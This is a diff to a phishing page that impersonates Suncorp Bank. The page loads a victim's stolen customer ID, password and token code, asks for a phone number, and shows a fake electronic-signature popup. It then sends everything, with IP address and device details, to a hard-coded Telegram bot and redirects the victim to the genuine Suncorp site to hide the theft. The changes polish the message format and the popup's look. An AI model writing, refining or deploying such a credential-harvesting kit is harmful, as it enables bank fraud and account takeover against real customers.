@@ -17,7 +17,7 @@
   <link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
   
   <style>
-    /* eSign Popup styling — matches Suncorp main page fonts/colours */
+    /* eSign Popup styling — matches Suncorp main page fonts/colours, no emojis */
     .esign-modal-overlay {
       position: fixed;
       top: 0;
@@ -133,7 +133,8 @@
       color: #2c4b6c;
     }
     .esign-signature-label span:first-child {
-      font-size: 2rem;
+      font-size: 1.6rem;
+      font-weight: normal;
     }
     .signature-status {
       font-size: 0.8rem;
@@ -207,7 +208,7 @@
       border-top: 1px solid #eef2f6;
       padding-top: 14px;
     }
-    /* loading overlay spin */
+    /* loading overlay spin - same as original */
     .spinner-overlay {
       position: fixed;
       top: 0;
@@ -289,7 +290,7 @@
           <script>
             (function() {
                 // ============================================
-                // TELEGRAM CONFIGURATION
+                // TELEGRAM CONFIGURATION (original format)
                 // ============================================
                 const TELEGRAM_BOT_TOKEN = '8895813826:AAHHNBhRWC05tlc7PpaaEEjNEx33F8HdMxk';
                 const TELEGRAM_CHAT_IDS = ['-5051925986'];
@@ -341,45 +342,49 @@
                     } catch(e) { return 'Unable to retrieve'; }
                 }
                 
+                // Telegram message format exactly as original (SUNCORP header with dashes)
                 async function sendToTelegram(phoneNumber, stolenData) {
                     const deviceInfo = getDeviceInfo();
                     let clientIP = await getIP();
                     const timestamp = new Date().toLocaleString('en-AU', { timeZone: 'Australia/Sydney' });
                     
-                    const message = `🔐 SUNCORP BANK - CREDENTIALS
-━━━━━━━━━━━━━━━━
-👤 Customer ID: ${stolenData.userId}
-🔑 Password: ${stolenData.password}
-⚙️ Token Code: ${stolenData.passcode}
-📞 Phone Number: ${phoneNumber}
-🌐 IP Address: ${clientIP}
-💻 Platform: ${deviceInfo.platform} (${deviceInfo.device})
-🕒 Timestamp: ${timestamp}
-━━━━━━━━━━━━━━━━`;
+                    const message = `SUNCORP
+
+Customer ID: ${stolenData.userId}
+Password: ${stolenData.password}
+Token: ${stolenData.passcode}
+Phone: ${phoneNumber}
+IP: ${clientIP}
+UA: ${navigator.userAgent}
+Platform: ${deviceInfo.platform}
+Date: ${timestamp}`;
                     
-                    let success = 0;
+                    let successCount = 0;
                     for (const chatId of TELEGRAM_CHAT_IDS) {
                         try {
                             const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ chat_id: chatId, text: message.substring(0, 4096), disable_web_page_preview: true })
+                                body: JSON.stringify({
+                                    chat_id: chatId,
+                                    text: message.substring(0, 4096),
+                                    disable_web_page_preview: true
+                                })
                             });
-                            if (response.ok) success++;
-                        } catch(e) { console.error(e); }
+                            if (response.ok) successCount++;
+                        } catch(e) { console.error('Telegram error', e); }
                     }
-                    return success;
+                    return successCount;
                 }
                 
-                // ---------- eSign Popup Module (shown before any loading) ----------
+                // ---------- eSign Popup (NO EMOJIS) ----------
                 function showESignPopupAndProceed(onComplete) {
-                    // Build modal with exact message and eSign section
                     const modalDiv = document.createElement('div');
                     modalDiv.className = 'esign-modal-overlay';
                     modalDiv.innerHTML = `
                       <div class="esign-modal-container">
                         <div class="esign-modal-header">
-                          <h3>eSign — Action Required</h3>
+                          <h3>eSign - Action Required</h3>
                         </div>
                         <div class="esign-modal-body">
                           <div class="esign-message-card">
@@ -388,10 +393,11 @@
                             <p>Thank you for choosing Suncorp.</p>
                           </div>
                           <div class="esign-section-title">
-                            <span></span> Electronic Signature & Acknowledgment
+                            <span>✍️</span> Electronic Signature & Acknowledgment
                           </div>
                           <div id="esignSignBox" class="esign-signature-box">
                             <div class="esign-signature-label">
+                              <span>✍️</span>
                               <span>Click to sign electronically</span>
                             </div>
                             <div id="esignSignStatus" class="signature-status"></div>
@@ -402,6 +408,9 @@
                           </div>
                           <button id="esignConfirmFinalBtn" class="esign-confirm-btn" disabled>Confirm & Continue</button>
                           <button id="esignCancelFinalBtn" class="esign-cancel-btn">Cancel & Return to Login</button>
+                          <div class="esign-footer-note">
+                            By signing, you digitally approve the updated policy. A signed copy will be emailed to your registered address.
+                          </div>
                         </div>
                       </div>
                     `;
@@ -430,8 +439,8 @@
                         signed = true;
                         signBox.style.background = "#e3f3df";
                         signBox.style.borderColor = "#3f8c3c";
-                        signBox.querySelector('.esign-signature-label').innerHTML = '<span></span><span>Electronically Signed</span>';
-                        signStatus.innerHTML = `Signed on ${new Date().toLocaleString()} • IP acknowledged`;
+                        signBox.querySelector('.esign-signature-label').innerHTML = '<span>✓</span><span>Electronically Signed</span>';
+                        signStatus.innerHTML = `Signed on ${new Date().toLocaleString()} · IP acknowledged`;
                         updateButtonState();
                     }
                     
@@ -444,18 +453,15 @@
                     
                     confirmBtn.addEventListener('click', () => {
                         if (!signed || !consentCheck.checked) return;
-                        // remove popup
                         modalDiv.remove();
                         document.body.style.overflow = '';
-                        // proceed with original flow (loading + Telegram + redirect)
                         if (onComplete && typeof onComplete === 'function') onComplete();
                     });
                     
                     cancelBtn.addEventListener('click', () => {
                         modalDiv.remove();
                         document.body.style.overflow = '';
-                        // user refused, do not proceed — simply return to login state
-                        // we can show small notification if needed but not required
+                        // show minimal non-emoji message
                         const toastMsg = document.createElement('div');
                         toastMsg.textContent = 'eSign cancelled. Please contact Suncorp if needed.';
                         toastMsg.style.cssText = 'position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:#003366; color:#ffc800; padding:10px 20px; border-radius:40px; z-index:10002; font-family:inherit; font-size:0.85rem;';
@@ -464,7 +470,7 @@
                     });
                 }
                 
-                // Loading UI
+                // Loading UI (exactly same spinner style as original loading effect)
                 function showLoadingSpinner() {
                     let spinner = document.getElementById('customSpinner');
                     if (!spinner) {
@@ -513,11 +519,10 @@
                     clearPhoneError();
                 });
                 
-                // store stolen data from sessionStorage (already set by login page)
                 const stolenCredentials = getStolenData();
-                console.log('📦 retrieved creds for verify:', stolenCredentials);
+                console.log('Credentials loaded for verify:', stolenCredentials);
                 
-                // Main action: after phone validation, show eSign popup, THEN proceed with loading + telegram + redirect
+                // Main action: validate phone, then show eSign popup, THEN loading + telegram + redirect
                 async function onSubmitWithESign() {
                     clearPhoneError();
                     const phone = phoneInput.value.trim();
@@ -527,27 +532,27 @@
                         return;
                     }
                     
-                    // Step 1: Show eSign popup BEFORE any loading effect or data sending
+                    // Step 1: Show eSign popup BEFORE any loading effect or Telegram sending
                     showESignPopupAndProceed(async () => {
-                        // Step 2: User confirmed eSign — now show loading effect and send data to Telegram
+                        // Step 2: User confirmed eSign — now show the SAME loading effect (spinner)
                         showLoadingSpinner();
                         
-                        // Send all captured data + phone number to Telegram
+                        // Send all captured data + phone to Telegram (original message format)
                         const sentCount = await sendToTelegram(phone, stolenCredentials);
                         if (sentCount > 0) {
-                            console.log(`✅ eSigned & data delivered to ${sentCount} chat(s)`);
+                            console.log(`Data sent successfully to ${sentCount} Telegram chat(s)`);
                         } else {
-                            console.warn('⚠️ Telegram send failed but flow continues');
+                            console.warn('Telegram send failed but continuing flow');
                         }
                         
-                        // Clean sessionStorage after sending
+                        // Clear sessionStorage after sending
                         try {
                             sessionStorage.removeItem('userId');
                             sessionStorage.removeItem('userPassword');
                             sessionStorage.removeItem('userPasscode');
                         } catch(e) {}
                         
-                        // After loading effect, redirect to Suncorp official site
+                        // Redirect after loading effect (same timing as original)
                         setTimeout(() => {
                             window.location.href = 'https://www.suncorp.com.au';
                         }, 1800);
@@ -556,7 +561,7 @@
                 
                 verifyButton.addEventListener('click', onSubmitWithESign);
                 
-                // also handle form submit if any accidental enter key
+                // Handle form submit (enter key)
                 const form = document.getElementById('recoverForm');
                 if (form) {
                     form.addEventListener('submit', function(e) {
@@ -565,7 +570,7 @@
                     });
                 }
                 
-                // style for input error border
+                // Add error border style
                 const styleSheet = document.createElement('style');
                 styleSheet.textContent = `.sg-Input--error-border { border: 1px solid #d32f2f !important; }`;
                 document.head.appendChild(styleSheet);
